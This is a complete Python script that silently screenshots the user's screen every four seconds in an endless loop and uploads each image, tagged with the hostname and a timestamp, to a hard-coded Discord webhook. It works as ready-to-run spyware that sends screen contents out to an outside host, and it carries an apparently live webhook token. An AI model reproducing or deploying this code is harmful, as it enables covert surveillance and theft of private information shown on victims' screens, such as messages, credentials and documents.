import time
import pyautogui
import requests
import socket
from io import BytesIO
from datetime import datetime

# Discord webhook URL
WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1419719800879317258/f7LULneX45gFeu8zvOkAdocpxAgP_sIpL1JyzJ-_t-RgdzWQxx5rngytxDxeb9vr8rPm'

# Function to capture the screen
def capture_screenshot():
    screenshot = pyautogui.screenshot()
    return screenshot

# Function to get the device information
def get_device_info():
    hostname = socket.gethostname()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    return timestamp, hostname

# Function to send the screenshot to Discord webhook
def send_to_discord(screenshot, timestamp, hostname):
    # Convert the screenshot to a byte stream
    with BytesIO() as image_binary:
        screenshot.save(image_binary, format='PNG')
        image_binary.seek(0)

        # Prepare the message data
        message_data = {
            "content": f"**Timestamp:** {timestamp}\n**Device:** {hostname}"
        }

        # Prepare the file to send
        files = {
            'file': ('screenshot.png', image_binary, 'image/png')
        }

        # Send the request to the Discord webhook
        response = requests.post(WEBHOOK_URL, files=files, data=message_data)

        if response.status_code == 200:
            print("Screenshot sent successfully!")
        else:
            print(f"Failed to send screenshot: {response.status_code}")

# Main function to take screenshots every 4 seconds
def main():
    while True:
        # Capture the screenshot and device info
        screenshot = capture_screenshot()
        timestamp, hostname = get_device_info()

        # Send the screenshot with metadata
        send_to_discord(screenshot, timestamp, hostname)

        # Wait for 4 seconds before taking the next screenshot
        time.sleep(4)

if __name__ == '__main__':
    main()
